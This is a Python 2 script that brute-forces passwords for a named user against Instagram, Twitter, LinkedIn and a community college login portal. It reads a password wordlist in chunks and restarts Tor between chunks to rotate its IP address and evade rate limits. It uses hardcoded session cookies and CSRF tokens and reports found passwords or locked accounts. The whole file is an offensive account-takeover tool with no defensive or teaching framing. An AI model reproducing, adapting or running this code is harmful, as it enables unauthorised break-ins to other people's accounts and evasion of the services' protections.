import os
import sys
import time
import socks
import socket
import urllib2
import requests
import subprocess
from termcolor import colored


arglist = sys.argv

def instagram(username, password):
    URL = 'https://www.instagram.com/accounts/login/?force_classic_login'

    Requested_url = 'https://instagram.com/'


    payload = {

        'username': username,
        'password': password,
        'csrfmiddlewaretoken': 'daUB2CazhMBB63hjRUdmWQyK0T3seJq1'
        }

    headers = {
            'Host': 'www.instagram.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Referer': 'https://www.instagram.com/accounts/login/?force_classic_login',
            'Cookie': 'rur=PRN; mcd=3; mid=W4CqpAAEAAFydAOgdcBYV9nFNgg7; csrftoken=daUB2CazhMBB63hjRUdmWQyK0T3seJq1; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=_CQEYF66Miavns0ZVNUkp7xFDtqYBWJNdKtRue2MEwI.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUURCb0lYejh4MWFyZWlkenQwSzB5WGwzb3F4U0RqdTJWRHktdjVWSDIyaWxDY1VRaEpYeHJyMjFBWDJUVUJQbVEtRXZzNlVobDVCaE1TdE5ZbVhPTUw5TlZhNTJPX25rTW9SMEk0R1ZqNmxrU3A2a2s1b19yLVZiT3hHUkplNW1IenZQTjlFaHFZeDNKWF9weWRBd25QakJaZmhmNTVVMUdaaDJwZTlRZVFNcEFselAwV09tQlZTaXlIRkppWWl6aTFiaERCemxhb3kxUWQxUzVBMmlLdUtPVEhZWVF1NUk2S0FsUTRLVC1SRnE0cFZfM3RTWkNrTnFDeHp1cTZsU3JPcC01QWJBbWQxZzVzR3E3QTVXYWc4eHJEZlZKTjF6Y25sMFJFa2c4aE9EaHlPUF9mcWhOdXRkUmhtQU9QajlmdmlIVmgwUnAzQ0VLRDNxOVZHRHVzUyIsImlzc3VlZF9hdCI6MTUzNTE1ODk1NSwidXNlcl9pZCI6IjEwMDAwNDQ2MDcxMjEwOCJ9; csrftoken=daUB2CazhMBB63hjRUdmWQyK0T3seJq1; urlgen="{}:1ftN0T:ZIZ24YzvD4BVprtNXW08ELU8hV0"',
            'DNT': '1',
            'Connection': 'keep-alive'
        }

    with requests.Session() as session:
        post = session.post(URL, data=payload, headers=headers)
        r = session.get(Requested_url, headers=headers)
        wrongString = "The link you followed may be broken, or the page may have been removed."
        if wrongString in post.content:
            print ('Incorrect Password ' + password)
        elif (username in post.content) or (post.url == 'https://www.instagram.com/'):
            print colored("[*] Password Found: %s ", "green") % password
            sys.exit()
        else:
            print colored("Couldn't check probably found: %s", "red") % password
            print(post.url)
            sys.exit()
            
def twitter(username, password):
    URL = 'https://twitter.com/sessions'

    Requested_url = 'https://twitter.com/Crea80r/moments'

    payload = {

    'session[username_or_email]': username,
    'session[password]': password,
    'authenticity_token': 'fa336574333f8dffc6d8ebd549e8a3a55d8dcefc',
    'scribe_log': '',
    'redirect_after_login': ''
    }

    headers = {
        'Host': 'twitter.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': "_twitter_sess=BAh7CiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCA4eTmRlAToMY3NyZl9p%250AZCIlMmRiMmM0MWU3ZGIxNzg1NTAyN2FmMjQyMDk1M2RmNWI6B2lkIiU2MDBl%250AN2VjNDJjYjM2MWRiZjUyYzgzODJiN2QwYjliNjoJdXNlcmwrCQDgljaDQJMM--e0e3305293a6ab41edc706ea9c53f0741fffb05f; ct0=1d9a3bd432a6d1849713db14a83f1cbe; dnt=1; kdt=Uw44ShTODEVAMo1rRxobtig0fvzaYSNa2td3rMQ3; remember_checked_on=1; lang=en; personalization_id=""v1_Yg95P3bdcma6vauEKg7vWg==""; guest_id=v1%3A153499264583915556",
        'DNT': '1',
        'Connection': 'keep-alive'
    }

    with requests.Session() as session:
        post = session.post(URL, data=payload, headers=headers)
        r = session.get(Requested_url, headers=headers)
        if post.url == 'https://twitter.com/':
            print ('[*] Password Found: ' + password)
            sys.exit()
        elif 'error?username_or_email' in post.url:
            print ('Incorrect Password ' + password)
        elif 'login_challenge' in post.url:
            print ('Password found but account locked ' + password)
            sys.exit()
        elif post.url == 'https://twitter.com/account/access':
            print ('Password found but account locked and password change required ' + password)
            sys.exit()
        else:
            print post.url

def linkedin(username, password):
    URL = 'https://www.linkedin.com/uas/login-submit'

    Requested_url = 'https://www.linkedin.com/psettings/'

    payload = {

        'session_key': username,
        'session_password': password,
        'loginCsrfParam': 'b2c968de-c532-43dd-8955-caea3fcb908f'
    }

    headers = {
        'Host': 'www.linkedin.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': 'JSESSIONID=ajax:6400759886812458415; lang="v=2&lang=en-us"; bcookie="v=2&b2c968de-c532-43dd-8955-caea3fcb908f"; bscookie="v=1&201808230459296379c623-890e-49a8-8d52-2af52fd0ba5fAQGnNoy6i9NN3tHVbPlPt6D7lun9oZz9"; lidc="b=TGST03:g=1067:u=1:i=1535000370:t=1535086770:s=AQGb9WkxNcYuIaTqO3tz4oQ8LuS2HGtT"; _ga=GA1.2.677962608.1535000371; _gat=1; leo_auth_token="GST:8hULu1Sclj7Iwi4-o2fU3bFgKc2LEMOBNqUfulSN0q2qg44-8SFUaY:1535000381:eefd9b7e9cfb0e4192027b7f741a80dd18251f27"; visit="v=1&G"; RT=s=1535000377146&r=https%3A%2F%2Fwww.linkedin.com%2F',
        'DNT': '1',
        'Connection': 'keep-alive'
    }

    with requests.Session() as session:
        post = session.post(URL, data=payload, headers=headers)
        r = session.get(Requested_url, headers=headers)
        if 'Rashwan' in r.text:
            print ('[*] Password Found: ' + password)
            sys.exit()
        else:
            print ('Incorrect password ' + password)

def lccc(username, password):
    URL = 'https://my.lccc.edu'

    Requested_url = 'https://my.lccc.edu'

    payload = {

        'username': username,
        'password': password,
        'sessionDataKey': 'b2c968de-c532-43dd-8955-caea3fcb908f'
    }

    headers = {
        'Host': 'idp.quicklaunchsso.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': 'https://idp.quicklaunchsso.com/authenticationendpoint/login.do?commonAuthCallerPath=%2Fpassivests&forceAuth=false&passiveAuth=false&tenantDomain=mylccc.edu&wa=wsignin1.0&wct=2018-08-23T23%3A37%3A28Z&wctx=rm%3D0%26id%3Dpassive%26ru%3D%252fcas%252flogin%253fservice%253dhttps%25253A%25252F%25252Fmy.lccc.edu%25252Fc%25252Fportal%25252Flogin&wtrealm=https%3A%2F%2Fcps70.quicklaunchsso.com%2F&sessionDataKey=c535fa9b-5620-41d9-a468-71ee745e8f1d&relyingParty=https%3A%2F%2Fcps70.quicklaunchsso.com%2F&type=passivests&sp=cps70.quicklaunchsso.com&isSaaSApp=false&authenticators=BasicAuthenticator:LOCAL',
        # 'Cookie': 'JSESSIONID=10EF51457740B9A86FB1BDA8253B0DC2.idp04; ROUTEID=.4',
        'DNT': '1',
        'Connection': 'keep-alive'
    }

    with requests.Session() as session:
        post = session.post(URL, data=payload, headers=headers)
        r = session.get(Requested_url, headers=headers)
        if 'Login failed.' in r.text:
            print ('Incorrect password ' + password)
        else:
            print ('[*] Password Found: ' + password)
            sys.exit()

def ipExist(ipAdd):
    if ipAdd in open('iplist.txt', 'a+').read():
        print(ipAdd.strip() + ' IP Already Exist, trying new one')
        updateIP()
    else:
        f = open('iplist.txt', 'a+')
        f.write(ipAdd)
        ipList()

def ipList():

    f = open('iplist.txt', 'r')
    g = []

    for line in f.readlines():
        g.append(line)
    if len(g) > 5:
        del g[0:3]
        f = open('iplist.txt', 'w')
        for item in g:
            f.write(item)

def checkIP():
    myIP = ''
    try:
        myIP = requests.get('https://wtfismyip.com/text').text
        ipExist(myIP)
    except socks.ProxyConnectionError:
        time.sleep(10)
        updateIP()
    print 'IP Address updated to: ' + myIP

def restartTor():
    cmd = ['service','tor','restart']
    subprocess.Popen(cmd).wait()
    time.sleep(.5)

def stopTor():
    cmd = ['service', 'tor', 'stop']
    subprocess.Popen(cmd).wait()

def updateIP():
    restartTor()
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050,True)
    socket.socket=socks.socksocket
    checkIP()

def passwordSetup(site, user, pswd):


        with open(pswd) as f:

                lines = f.read().splitlines()
                chunks = [lines[x:x+3] for x in xrange(0, len(lines), 3)]
        
        if site == 'twitter':
            brute = twitter
            sleepTime = 30
        elif site == 'linkedin':
            brute = linkedin
            sleepTime = 10
        elif site == 'lccc':
            brute = lccc
            sleepTime = 1
        elif site == 'instagram':
            brute = instagram
            sleepTime = 20

        for eachList in chunks:
                time.sleep(5)
                updateIP()
                for phrase in eachList:
                    time.sleep(sleepTime)
                    brute(user, phrase)

def main():

    site = arglist[1]
    user = arglist[2]
    pswd = arglist[3]
    passwordSetup(site, user, pswd)


main()